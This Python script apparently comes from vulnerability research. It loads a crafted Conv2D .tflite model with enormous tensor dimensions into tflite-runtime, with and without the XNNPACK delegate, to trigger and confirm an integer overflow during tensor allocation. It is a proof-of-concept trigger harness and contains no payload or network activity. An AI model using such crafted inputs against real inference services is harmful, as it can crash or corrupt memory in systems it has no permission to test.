"""
Production-level .tflite model loader for XNNPACK overflow verification.

Loads crafted_conv2d.tflite using tflite-runtime with XNNPACK delegate
(the production code path), and also without it (baseline check).

Usage:
    python3 load_crafted_model.py [--no-xnnpack]
"""

import sys
import os
import signal
import traceback
import tflite_runtime.interpreter as tflite

MODEL_PATH = "/home/user/xnnpack-vuln/crafted_conv2d.tflite"


def try_load_with_xnnpack():
    print("=" * 60)
    print("TEST 1: TFLite with XNNPACK delegate (production path)")
    print("=" * 60)
    print(f"  Model: {MODEL_PATH}")
    print(f"  Input:  [1, 506164742, 506168762, 1]")
    print(f"  Filter: [2, 3, 3, 1], Conv2D 3x3 stride=1 VALID")
    print(f"  Output: [1, 506164740, 506168760, 2]")
    print()
    print("  Loading interpreter with num_threads=1 ...")
    print("  (XNNPACK is the default acceleration delegate in tflite-runtime)")
    print()

    try:
        # tflite-runtime enables XNNPACK by default since 2.7+
        interp = tflite.Interpreter(
            model_path=MODEL_PATH,
            num_threads=1,
        )
        print("  [+] Interpreter created")

        print("  [*] Calling allocate_tensors() ...")
        print("  [*] This triggers reshape -> reshape_igemm -> OVERFLOW")
        interp.allocate_tensors()

        print("  [!] allocate_tensors() returned without crash")
        print("  [!] XNNPACK may not be active or shape rejected upstream")

        details = interp.get_input_details()
        print(f"  Input details: {details[0]['shape']}")

    except SystemError as e:
        print(f"  [!] SystemError (interpreter crash): {e}")
    except Exception as e:
        print(f"  [!] Exception during load: {type(e).__name__}: {e}")
        traceback.print_exc()


def try_load_without_xnnpack():
    print()
    print("=" * 60)
    print("TEST 2: TFLite without XNNPACK (reference TFLite kernel)")
    print("=" * 60)
    print("  Checking if model is accepted by base TFLite ...")
    print()

    try:
        # Disable XNNPACK explicitly by providing experimental_delegates=[]
        # and setting num_threads in a way that bypasses XNNPACK
        interp = tflite.Interpreter(
            model_path=MODEL_PATH,
            num_threads=1,
            experimental_delegates=[],
        )
        print("  [+] Interpreter created (no XNNPACK)")
        print("  [*] Calling allocate_tensors() ...")
        interp.allocate_tensors()
        print("  [+] allocate_tensors() OK (no XNNPACK → no overflow)")
        details = interp.get_input_details()
        print(f"  Input details: {details[0]['shape']}")
    except Exception as e:
        print(f"  [!] Exception: {type(e).__name__}: {e}")


if __name__ == "__main__":
    if not os.path.exists(MODEL_PATH):
        print(f"ERROR: Model not found at {MODEL_PATH}")
        print("Run: python3 make_crafted_tflite.py")
        sys.exit(1)

    print(f"File size: {os.path.getsize(MODEL_PATH)} bytes")
    print(f"Magic bytes: {open(MODEL_PATH,'rb').read(8).hex()}")
    print()

    try_load_with_xnnpack()
    try_load_without_xnnpack()
